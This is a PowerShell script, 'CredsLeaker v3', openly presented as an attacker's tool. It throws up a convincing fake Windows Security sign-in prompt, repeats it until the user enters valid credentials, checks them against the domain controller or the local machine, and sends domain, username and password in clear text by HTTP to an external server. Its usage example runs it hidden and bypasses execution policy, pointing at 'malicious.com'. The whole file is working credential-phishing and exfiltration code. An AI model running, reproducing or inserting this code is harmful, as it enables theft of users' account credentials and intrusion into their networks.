<#
.SYNOPSIS
    Credentials Leaker v3 By Dviros
    Author: Dviros
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION
    Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and in turn leak it via an HTTP request.

.PARAMETER Caption
    Message box title.

.PARAMETER Message
	Message box message.

.PARAMETER Server
	External web server IP or FQDN.

.PARAMETER Port
	Web server's IP.

.EXAMPLE
    Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080"

.LINK
    
	https://github.com/Dviros/CredsLeaker
	https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
	https://www.bleepingcomputer.com/news/security/psa-beware-of-windows-powershell-credential-request-prompts/
#>

 
param (
	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 0)]
	[string]$Caption = 'Sign in',
    
	[Parameter(Mandatory = $false,ValueFromPipeline = $true,Position = 1)]
    [string]$Message = 'Enter your credentials',

    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 2)]
    [string]$Server = '$( Read-Host "Input Server Address (FQDN\IP): " )',

    [Parameter(Mandatory = $true,ValueFromPipeline = $true,Position = 3)]
    [string]$Port = $( Read-Host "Input Server Port: " )
)

# Prerequisites
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$CurrentDomain_Name = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

# For our While loop
$status = $true


# There are 6 different authentication protocols supported.
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = $Caption
$options.Message = $Message
$options.TargetName = "1"


# CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

function Leaker($domain,$username,$password){
    try{
        Invoke-WebRequest http://$Server":"$Port/$domain";"$username";"$password -Method GET -ErrorAction Ignore
        }
    catch{}
    }

function Credentials(){
    while ($status){
        
        # Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if (!$creds.CredentialPassword -or $creds.CredentialPassword -eq $null){
            Credentials
        }
        if (!$creds.CredentialUserName){
            Credentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $Password = $creds.CredentialPassword;
            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                $domain = "WORKGROUP"
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
                    Leaker $domain $Username $Password
                    $status = $false
                    exit
                    }
                else {
                    Credentials
                    }                
                }

            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
            if ($domain.name -eq $null){
                Credentials
            }
            else {
                leaker $CurrentDomain_Name $username $password
                $status = $false
                exit
            }
        }
    }
}


Credentials
